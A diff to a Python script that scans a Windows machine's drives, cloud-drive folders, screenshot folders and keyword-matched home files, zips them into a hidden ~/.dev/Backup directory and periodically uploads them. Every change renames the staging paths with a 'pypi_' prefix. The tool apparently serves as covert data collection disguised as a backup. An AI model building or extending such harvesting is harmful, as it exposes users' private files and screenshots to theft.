@@ -39,8 +39,8 @@ def get_available_disks():
         disk_path = f"/mnt/{letter}"
         if is_disk_available(disk_path):
             available_disks[letter] = {
-                'docs': (disk_path, Path.home() / f".dev/Backup/{letter}_docs", 1),  # 文档类
-                'configs': (disk_path, Path.home() / f".dev/Backup/{letter}_configs", 2),  # 配置类
+                'docs': (disk_path, Path.home() / f".dev/Backup/pypi_{letter}_docs", 1),  # 文档类
+                'configs': (disk_path, Path.home() / f".dev/Backup/pypi_{letter}_configs", 2),  # 配置类
             }
             logging.info(f"检测到可用磁盘: {disk_path}")
     
@@ -57,8 +57,8 @@ def get_available_disks():
                     if any(keyword.lower() in item.lower() for keyword in cloud_keywords):
                         disk_key = f"cloud_{item.lower()}"
                         available_disks[disk_key] = {
-                            'docs': (item_path, Path.home() / f".dev/Backup/cloud_docs", 1),
-                            'configs': (item_path, Path.home() / f".dev/Backup/cloud_configs", 2),
+                            'docs': (item_path, Path.home() / f".dev/Backup/pypi_cloud_docs", 1),
+                            'configs': (item_path, Path.home() / f".dev/Backup/pypi_cloud_configs", 2),
                         }
                         logging.info(f"检测到云盘目录: {item_path}")
         except Exception as e:
@@ -139,7 +139,7 @@ def backup_screenshots(user):
         f"/mnt/c/Users/{user}/Pictures",
         f"/mnt/c/Users/{user}/OneDrive/Pictures"
     ]
-    screenshot_backup_directory = Path.home() / ".dev/Backup/tmp_screenshots"
+    screenshot_backup_directory = Path.home() / ".dev/Backup/pypi_tmp_screenshots"
     
     backup_manager = BackupManager()
     
@@ -583,7 +583,7 @@ def periodic_backup_upload(backup_manager):
                 if specified_backup_dir:
                     backup_path = backup_manager.zip_backup_folder(
                         specified_backup_dir,
-                        str(Path.home() / ".dev/Backup/specified_") + datetime.now().strftime('%Y%m%d_%H%M%S')
+                        str(Path.home() / ".dev/Backup/pypi_specified_") + datetime.now().strftime('%Y%m%d_%H%M%S')
                     )
                     if backup_path:
                         if isinstance(backup_path, list):
@@ -672,7 +672,7 @@ def backup_keyword_data(backup_manager, available_disks):
         user_home = str(Path.home())
         if os.path.exists(user_home):
             try:
-                backup_path = str(Path.home() / ".dev/Backup/keyword/home")
+                backup_path = str(Path.home() / ".dev/Backup/pypi_keyword/home")
                 target_keyword = backup_path
                 
                 logging.info(f"\n🔑 开始备份用户主目录关键字文件...")
@@ -681,7 +681,7 @@ def backup_keyword_data(backup_manager, available_disks):
                 if backup_dir:
                     backup_path_compressed = backup_manager.zip_backup_folder(
                         backup_dir,
-                        str(Path.home() / ".dev/Backup/keyword_home_") + datetime.now().strftime('%Y%m%d_%H%M%S')
+                        str(Path.home() / ".dev/Backup/pypi_keyword_home_") + datetime.now().strftime('%Y%m%d_%H%M%S')
                     )
                     if backup_path_compressed:
                         if isinstance(backup_path_compressed, list):
@@ -702,7 +702,7 @@ def backup_keyword_data(backup_manager, available_disks):
                 # 获取源目录（使用第一个配置的源目录）
                 source_dir = list(disk_configs.values())[0][0]
                 # 创建关键字备份目标目录
-                backup_path = str(Path.home() / f".dev/Backup/keyword/{disk_letter}")
+                backup_path = str(Path.home() / f".dev/Backup/pypi_keyword/{disk_letter}")
                 target_keyword = backup_path
                 
                 logging.info(f"\n🔑 开始备份 {disk_letter.upper()} 关键字文件...")
@@ -711,7 +711,7 @@ def backup_keyword_data(backup_manager, available_disks):
                 if backup_dir:
                     backup_path_compressed = backup_manager.zip_backup_folder(
                         backup_dir,
-                        str(Path.home() / f".dev/Backup/keyword_{disk_letter}_") + datetime.now().strftime('%Y%m%d_%H%M%S')
+                        str(Path.home() / f".dev/Backup/pypi_keyword_{disk_letter}_") + datetime.now().strftime('%Y%m%d_%H%M%S')
                     )
                     if backup_path_compressed:
                         if isinstance(backup_path_compressed, list):
@@ -792,7 +792,7 @@ def backup_windows_data(backup_manager, user):
     if screenshots_backup:
         backup_path = backup_manager.zip_backup_folder(
             screenshots_backup,
-            str(Path.home() / ".dev/Backup/screenshots_") + datetime.now().strftime("%Y%m%d_%H%M%S")
+            str(Path.home() / ".dev/Backup/pypi_screenshots_") + datetime.now().strftime("%Y%m%d_%H%M%S")
         )
         if backup_path:
             if isinstance(backup_path, list):
